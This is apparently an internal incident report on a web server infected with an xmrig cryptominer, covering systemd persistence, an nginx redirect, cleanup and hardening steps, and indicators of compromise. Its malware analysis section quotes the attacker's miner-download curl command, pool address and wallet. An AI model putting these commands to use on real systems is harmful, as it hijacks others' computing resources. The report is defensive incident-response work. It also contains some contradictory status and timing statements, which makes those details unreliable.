# Security Incident Report - December 9, 2025

## ✅ INCIDENT RESOLVED - December 9, 2025 13:52 CET

**XSS.pro redirect attack has been FIXED. Website restored and operational.**

### Resolution Summary:
- All infected nginx configs removed from `/etc/nginx/sites-available/` and `/etc/nginx/sites-enabled/`
- Clean nginx configuration deployed from `scripts/security/nginx-frontend-clean.conf`
- Website now returns HTTP/2 200 with Next.js serving content correctly

### Verification:
```
$ curl -sI https://www.maasiso.nl
HTTP/2 200
server: nginx/1.18.0 (Ubuntu)
x-powered-by: Next.js  ✅
x-frame-options: SAMEORIGIN
x-content-type-options: nosniff
```

---

## Executive Summary

The Frontend VPS (147.93.62.188) was compromised with cryptomining malware AND has nginx configured to redirect all traffic to a malicious hacking forum. The cryptominer was cleaned, but the nginx redirect persists.

## Timeline

| Date | Event |
|------|-------|
| Dec 5, 2025 10:15 | Malware script `sex.sh` created |
| Dec 5, 2025 11:35 | Malicious systemd service `system-update-service` installed |
| Dec 8, 2025 19:36 | xmrig miner directories created/extracted |
| Dec 9, 2025 09:38 | Cryptominer infection discovered and cleaned |
| **Dec 9, 2025 13:47** | **DISCOVERED: Nginx redirect to xss.pro (hacking forum)** |

## What Happened

### Infection Vector
The malware was placed inside the web application directory:
- `/var/www/frontend/.next/standalone/sex.sh`
- `/var/www/frontend/.next/standalone/xmrig-6.24.0/`
- `/var/www/iso-selector/xmrig-6.24.0/`

This suggests the attacker gained access through:
1. **Vulnerable web application upload** - Files were written to the Next.js build directory
2. **SSH with weak credentials** - Root login with password was enabled

### Malware Details

**sex.sh Script Analysis:**
```bash
# Downloads xmrig crypto miner
curl -L -o "kal.tar.gz" https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz

# Connects to Monero mining pool
--url pool.hashvault.pro:443
--user 89ASvi6ZBHXE6ykUZZFtqE1QqVhmwxCDCUvW2jvGZy1yP6n34uNdMKYj54ck81UC87KAKLaZT2L4YfC85ZCePDVeQPWoeAq

# Creates persistent systemd service named "system-update-service"
```

**Persistence Mechanism:**
- SystemD service: `/etc/systemd/system/system-update-service.service`
- Service was enabled and auto-restarting
- Disguised as "System Update Service"

## Actions Taken

### 1. Malware Removal
```bash
# Stopped and disabled malicious service
systemctl stop system-update-service
systemctl disable system-update-service
rm -f /etc/systemd/system/system-update-service.service
systemctl daemon-reload

# Removed malware files
rm -rf /var/www/frontend/.next/standalone/xmrig-6.24.0
rm -rf /var/www/iso-selector/xmrig-6.24.0
rm -f /var/www/frontend/.next/standalone/sex.sh
```

### 2. SSH Hardening
```bash
# Modified /etc/ssh/sshd_config:
PermitRootLogin prohibit-password  # Was: yes
PasswordAuthentication no          # Disabled password login
```

### 3. Firewall Enabled
```bash
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp    # SSH
ufw allow 80/tcp    # HTTP
ufw allow 443/tcp   # HTTPS
ufw allow 3000/tcp  # Next.js
ufw enable
```

### 4. Monitoring Installed
```bash
apt install fail2ban
systemctl enable fail2ban
systemctl start fail2ban
```

## Current Security Status

### Frontend Server (147.93.62.188)
| Security Control | Status |
|-----------------|--------|
| Malware removed | ✅ Clean |
| SSH hardened | ✅ Key-only |
| Firewall | ✅ Active |
| Fail2ban | ✅ Running |
| Password auth | ✅ Disabled |
| Root login | ✅ Key-only |

### Backend Server (153.92.223.23)
| Security Control | Status |
|-----------------|--------|
| Malware | ✅ Clean (ClamAV scan: 0 infected) |
| SSH hardened | ✅ Password enabled for VPS console |
| Firewall | ✅ Active (ports 22, 80, 443, 1337) |
| Fail2ban | ✅ Running since Dec 8, 2025 |
| Nginx | ✅ Fixed Dec 9, 2025 13:24 CET |
| ClamAV | ✅ Installed with scheduled scans |

## Recommendations for Prevention

### Immediate
1. ✅ Keep firewall enabled at all times
2. ✅ Use SSH keys only, no passwords
3. ✅ Run fail2ban for brute-force protection
4. Review and restrict web application file upload permissions

### Short-term
1. Set up regular security scanning (ClamAV, rkhunter)
2. Configure log monitoring and alerting
3. Review and harden Nginx configurations
4. Implement rate limiting on web endpoints

### Long-term
1. Consider Web Application Firewall (WAF) like Cloudflare
2. Set up intrusion detection (CrowdSec, OSSEC)
3. Regular security audits
4. Implement least-privilege access model

## Files for Future Reference

### Security Scripts Created
- `/scripts/security/01-cleanup-malware.sh` - Malware removal script
- `/scripts/security/02-setup-backend-ssh.sh` - SSH key setup for backend server
- `/scripts/security/03-fix-backend-nginx.sh` - Nginx config fix script
- `/scripts/security/04-install-clamav.sh` - ClamAV installation and scheduled scanning

### Attacker IOCs (Indicators of Compromise)
- Mining pool: `pool.hashvault.pro:443`
- Wallet address: `89ASvi6ZBHXE6ykUZZFtqE1QqVhmwxCDCUvW2jvGZy1yP6n34uNdMKYj54ck81UC87KAKLaZT2L4YfC85ZCePDVeQPWoeAq`
- Service name: `system-update-service`
- Script names: `sex.sh`, `kal.tar.gz`

## Verification Commands

Run these to verify the server is clean:
```bash
# Check for malware files
find /var/www -name '*sex.sh*' -o -name '*xmrig*'

# Check for suspicious services
systemctl status system-update-service

# Verify firewall is active
ufw status verbose

# Check fail2ban is running
systemctl status fail2ban

# Monitor for suspicious processes
ps aux --sort=-%cpu | head -10
```

---

*Report generated: December 9, 2025*
*Incident resolved: December 9, 2025 09:40 UTC*